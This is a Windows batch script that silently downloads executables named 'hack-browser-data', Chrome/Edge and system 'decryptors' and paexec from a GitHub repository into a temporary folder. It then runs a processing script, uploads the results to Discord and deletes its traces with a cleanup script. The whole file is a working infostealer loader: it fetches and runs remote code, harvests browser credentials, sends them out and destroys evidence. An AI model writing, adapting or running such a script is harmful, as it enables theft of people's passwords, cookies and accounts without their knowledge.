@echo off
setlocal EnableDelayedExpansion

REM Get timestamp using time and date commands
for /f "tokens=1-4 delims=/ " %%A in ('date /t') do set "date=%%D%%B%%C"
for /f "tokens=1-3 delims=:." %%A in ('time /t') do set "time=%%A%%B"
set "tempdir=%TEMP%\bb_%date%%time%"

REM Add random number to ensure uniqueness
set "tempdir=%tempdir%_%random%"

REM Create temp directory
mkdir "%tempdir%" 2>nul
if %ERRORLEVEL% NEQ 0 (
    echo Error: Failed to create temporary directory
    exit /b 2
)

cd "%tempdir%" || (
    echo Error: Failed to change directory
    rmdir "%tempdir%" 2>nul
    exit /b 3
)

echo Downloading files...
curl -L -s -o process.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/process.bat
curl -L -s -o hack-browser-data.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/hack-browser-data.exe

curl -L -s -o chrome_edge_decryptor.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/chrome_edge.exe
curl -L -s -o system_decryptor.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/system_decryptor.exe

curl -L -s -o paexec.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/paexec.exe

curl -L -s -o upload_discord.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/upload_discord.bat
curl -L -s -o cleanup.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/cleanup.bat

REM Verify all critical downloads
for %%F in (process.bat hack-browser-data.exe upload_discord.bat cleanup.bat chrome_edge_decryptor.exe system_decryptor.exe) do (
    if not exist "%%F" (
        echo Error: Failed to download %%F
        exit /b 4
    )
)
paexec.exe
REM Create running flag
echo %datetime% > "%tempdir%\running.tmp"
echo Starting process----------------------------------------
call "%tempdir%\process.bat"
echo uploading to discord----------------------------------------
call "%tempdir%\upload_discord.bat"
echo Waiting 1 seconds before cleanup...
echo Temp directory to be cleaned: %tempdir%
timeout /t 1 /nobreak >nul
echo Process finished, starting cleanup----------------------------------------
call "%tempdir%\cleanup.bat" "%tempdir%"
